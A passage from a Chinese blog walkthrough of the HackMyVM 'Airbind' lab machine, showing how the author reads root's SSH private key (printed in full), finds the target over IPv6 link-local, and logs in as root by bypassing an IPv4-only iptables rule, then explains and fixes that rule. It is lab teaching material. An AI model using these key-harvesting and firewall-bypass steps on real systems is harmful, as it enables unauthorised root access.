+-rw-------  <span class="token number">1</span> root root  <span class="token number">300</span> May <span class="token number">21</span> <span class="token number">15</span>:07 .sqlite_history
+drwx------  <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 .ssh
+-rw-------  <span class="token number">1</span> root root    <span class="token number">0</span> May <span class="token number">21</span> <span class="token number">15</span>:04 .wpa_cli_history
+-rwx------  <span class="token number">1</span> root root   <span class="token number">33</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:11 user.txt</code></pre>
+<p>root怎么给的是user flag,天真的我还以为root flag被藏起来，于是乎</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~<span class="token comment"># find / -name root.txt 2>/dev/null</span>
+root@ubuntu:~<span class="token comment"># </span></code></pre>
+<p>看了一下ip</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~<span class="token comment"># ifconfig</span>
+eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
+        inet <span class="token number">10.0</span>.3.241  netmask <span class="token number">255.255</span>.255.0  broadcast <span class="token number">10.0</span>.3.255
+        inet6 fe80::dea1:f7ff:fe82:7613  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">></span>
+        ether dc:a1:f7:82:76:13  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
+        RX packets <span class="token number">1871</span>  bytes <span class="token number">163504</span> <span class="token punctuation">(</span><span class="token number">163.5</span> KB<span class="token punctuation">)</span>
+        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
+        TX packets <span class="token number">1248</span>  bytes <span class="token number">458208</span> <span class="token punctuation">(</span><span class="token number">458.2</span> KB<span class="token punctuation">)</span>
+        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>
+
+lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">></span>  mtu <span class="token number">65536</span>
+        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0
+        inet6 ::1  prefixlen <span class="token number">128</span>  scopeid 0x1<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>host<span class="token operator">></span>
+        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>
+        RX packets <span class="token number">26</span>  bytes <span class="token number">2584</span> <span class="token punctuation">(</span><span class="token number">2.5</span> KB<span class="token punctuation">)</span>
+        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
+        TX packets <span class="token number">26</span>  bytes <span class="token number">2584</span> <span class="token punctuation">(</span><span class="token number">2.5</span> KB<span class="token punctuation">)</span>
+        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>
+
+wlan0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">409</span><span class="token operator"><span class="token file-descriptor important">9</span>&lt;</span>UP,BROADCAST,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
+        ether 02:00:00:00:00:00  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
+        RX packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> B<span class="token punctuation">)</span>
+        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
+        TX packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> B<span class="token punctuation">)</span>
+        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></code></pre>
+<p>原来我不在靶机里面，这就回到前面那个问题了，ssh端口被过滤了如何绕过<br>群主给的方案是ipv6绕过<br>找了几篇文章看了一下<br><a target="_blank" rel="noopener" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/using-ipv6-to-bypass-security/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/using-ipv6-to-bypass-security/</a><br><a target="_blank" rel="noopener" href="https://nmap.org/book/firewall-subversion.html">https://nmap.org/book/firewall-subversion.html</a><br>感觉就是过滤了ipv4,然后对于ipv6的安全防范没有考虑到位</p>
+<h2 id="ssh-root"><a href="#ssh-root" class="headerlink" title="ssh-root"></a>ssh-root</h2><p>先去看虚拟机里面有没有私钥</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~<span class="token comment"># cd .ssh</span>
+root@ubuntu:~/.ssh<span class="token comment"># ls -al</span>
+total <span class="token number">24</span>
+drwx------ <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 <span class="token builtin class-name">.</span>
+drwx------ <span class="token number">4</span> root root <span class="token number">4096</span> May <span class="token number">21</span> <span class="token number">15</span>:07 <span class="token punctuation">..</span>
+-rw------- <span class="token number">1</span> root root <span class="token number">2590</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:34 id_rsa
+-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">565</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:34 id_rsa.pub
+-rw------- <span class="token number">1</span> root root  <span class="token number">978</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 known_hosts
+-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">142</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 known_hosts.old
+root@ubuntu:~/.ssh<span class="token comment"># cat id_rsa</span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+<span class="token assign-left variable">EkGwPez9XGBEUAAAALcm9vdEB1YnVudHU</span><span class="token operator">=</span>
+-----END OPENSSH PRIVATE KEY-----
+root@ubuntu:~/.ssh<span class="token comment"># </span></code></pre>
+<p>保存留一下一会连接用<br>探测一下靶机ipv6地址</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ping6 ff02：：1%eth0
+PING ff02：：1%eth0 <span class="token punctuation">(</span>ff02::1%eth0<span class="token punctuation">)</span> <span class="token number">56</span> data bytes
+<span class="token number">64</span> bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.156</span> ms
+<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.734</span> ms
+<span class="token number">64</span> bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.025</span> ms
+<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.271</span> ms
+<span class="token number">64</span> bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.030</span> ms
+<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.276</span> ms
+c64 bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.026</span> ms
+<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.315</span> ms
+^C
+--- ff02：：1%eth0 <span class="token function">ping</span> statistics ---
+<span class="token number">4</span> packets transmitted, <span class="token number">4</span> received, +4 duplicates, <span class="token number">0</span>% packet loss, <span class="token function">time</span> 3005ms
+rtt min/avg/max/mdev <span class="token operator">=</span> <span class="token number">0.025</span>/0.229/0.734/0.221 ms</code></pre>
+<p>然后用私钥连接</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> aaa                                                
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+<span class="token assign-left variable">EkGwPez9XGBEUAAAALcm9vdEB1YnVudHU</span><span class="token operator">=</span>
+-----END OPENSSH PRIVATE KEY-----
+
+
+ ~/Desktop                                                                                                                                                                                                               root@kali2  <span class="token number">17</span>:23:40 
+<span class="token operator">></span> <span class="token function">chmod</span> <span class="token number">600</span> aaa
+
+ ~/Desktop                                                                                                                                                                                                               root@kali2  <span class="token number">17</span>:23:43 
+<span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> aaa root@fe80::a00:27ff:fe42:db30%eth0
+Linux airbind <span class="token number">6.1</span>.0-18-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
+the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
+individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@airbind:~<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groupes</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+root@airbind:~<span class="token comment"># ls</span>
+root.txt</code></pre>
+<p>然后苦于不知道原理问了一下群主老师<br>看一下靶机的端口开放情况</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># ss -tulnp</span>
+Netid                State                 Recv-Q                Send-Q                                  Local Address:Port                                 Peer Address:Port                Process                                           
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                            <span class="token number">10.0</span>.3.1:53                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">))</span></span>                 
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                      <span class="token number">0.0</span>.0.0%lxcbr0:67                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">))</span></span>                 
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                             <span class="token number">0.0</span>.0.0:67                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dhcpd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">640</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">))</span></span>                   
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                             <span class="token number">0.0</span>.0.0:68                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dhclient"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">367</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">))</span></span>                
+tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">32</span>                                           <span class="token number">10.0</span>.3.1:53                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">))</span></span>                 
+tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">128</span>                                           <span class="token number">0.0</span>.0.0:22                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"sshd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">642</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">))</span></span>                    
+tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">128</span>                                              <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                           <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                    users:<span class="token variable"><span class="token punctuation">((</span>"sshd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">642</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">))</span></span>   </code></pre>
+<p>发现有两个22端口对外开放，一个是ip4的(0.0.0.0)一个是ipv6的([::]),说明存在ipv6访问的可能</p>
+<p>再看一下靶机的iptables，iptables简单点可以理解为linux的防火墙</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># iptables -nL</span>
+Chain INPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
+target     prot opt <span class="token builtin class-name">source</span>               destination         
+ACCEPT     <span class="token number">6</span>    --  <span class="token number">192.168</span>.10.0/24      <span class="token number">0.0</span>.0.0/0            tcp dpt:22
+DROP       <span class="token number">6</span>    --  <span class="token number">0.0</span>.0.0/0            <span class="token number">0.0</span>.0.0/0            tcp dpt:22
+
+Chain FORWARD <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
+target     prot opt <span class="token builtin class-name">source</span>               destination         
+
+Chain OUTPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
+target     prot opt <span class="token builtin class-name">source</span>               destination     </code></pre>
+<p>第一条规则允许来自192.168.10.0&#x2F;24的ssh流量<br>第二条规则任何其他所有的ssh的流量都被丢弃<br>这个第二条规则就是导致22端口被过滤的原因</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># iptables -D INPUT 2</span></code></pre>
+<p>删除之后发现22端口开放</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.184                  
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-12 <span class="token number">17</span>:53 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.184
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00022s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http
+MAC Address: 08:00:27:42:DB:30 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
+<p>看一下ipv6 的iptable</p>
+<pre class="language-bahs" data-language="bahs"><code class="language-bahs">root@airbind:~# ip6tables -nL
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination   </code></pre>
+<p>但是，根据规则对于ipv6没有任何过滤 也就是说ipv6可以访问ssh服务<br>我尝试加个限制</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># ip6tables -A INPUT -p tcp --dport 22 -j DROP</span></code></pre>
+<p>发现ssh连不上了</p>
+<pre class="language-bsah" data-language="bsah"><code class="language-bsah">&gt; ssh -i aaa root@fe80::a00:27ff:fe42:db30%eth0</code></pre>
+<p>感觉不错，学到了不少东西。</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/a88f73eb/" title="HackMyVM-Airbind">https://tao0845.github.io/posts/a88f73eb/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/efc85f7f/" rel="prev" title="应急靶场-Linux入侵排查"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">应急靶场-Linux入侵排查</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/50cc8bce/" rel="next" title="HackMyVM-colors"><span class="post-nav-text">HackMyVM-colors</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" 